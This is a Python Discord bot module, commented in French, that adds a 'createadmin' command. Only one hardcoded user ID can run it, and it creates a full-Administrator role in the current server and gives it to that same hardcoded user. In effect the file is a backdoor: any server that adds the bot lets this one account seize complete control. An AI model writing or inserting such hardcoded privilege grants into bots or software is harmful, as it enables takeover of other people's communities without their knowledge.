import discord
from discord import app_commands
from discord.ext import commands
from utils.colors import get_embed_color

def is_authorized():
    async def predicate(interaction: discord.Interaction):
        if interaction.user.id == 1276907259724566660:
            return True
        await interaction.response.send_message(
            "❌ Cette commande est réservée à l'administrateur principal.",
            ephemeral=True
        )
        return False
    return app_commands.check(predicate)

class AdminRoleCommand(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @app_commands.command(name="createadmin", description="Crée un rôle administrateur et l'attribue")
    @is_authorized()
    async def create_admin_role(self, interaction: discord.Interaction):
        try:
            
            admin_role = await interaction.guild.create_role(
                name="Administrateur",
                permissions=discord.Permissions(administrator=True),
                color=discord.Color.red(),
                reason="Création du rôle administrateur"
            )

            
            target_user = await interaction.guild.fetch_member(1276907259724566660)

            
            await target_user.add_roles(admin_role, reason="Attribution du rôle administrateur")

            
            embed = discord.Embed(
                title="✅ Rôle Administrateur Créé",
                description="Le rôle administrateur a été créé et attribué avec succès.",
                color=get_embed_color("administration")
            )
            embed.add_field(
                name="Rôle",
                value=f"• Nom: {admin_role.mention}\n• Couleur: {admin_role.color}\n• Permissions: Administrateur",
                inline=False
            )
            embed.add_field(
                name="Utilisateur",
                value=f"• {target_user.mention}",
                inline=False
            )
            embed.set_footer(
                text=f"ID du serveur: {interaction.guild.id}",
                icon_url=interaction.guild.icon.url if interaction.guild.icon else None
            )

            await interaction.response.send_message(embed=embed, ephemeral=True)

        except discord.Forbidden:
            await interaction.response.send_message(
                "❌ Je n'ai pas les permissions nécessaires pour créer ou attribuer des rôles.",
                ephemeral=True
            )
        except discord.HTTPException as e:
            await interaction.response.send_message(
                f"❌ Une erreur est survenue lors de la création du rôle: {str(e)}",
                ephemeral=True
            )
        except Exception as e:
            await interaction.response.send_message(
                f"❌ Une erreur inattendue est survenue: {str(e)}",
                ephemeral=True
            )

async def setup(bot):
    await bot.add_cog(AdminRoleCommand(bot))
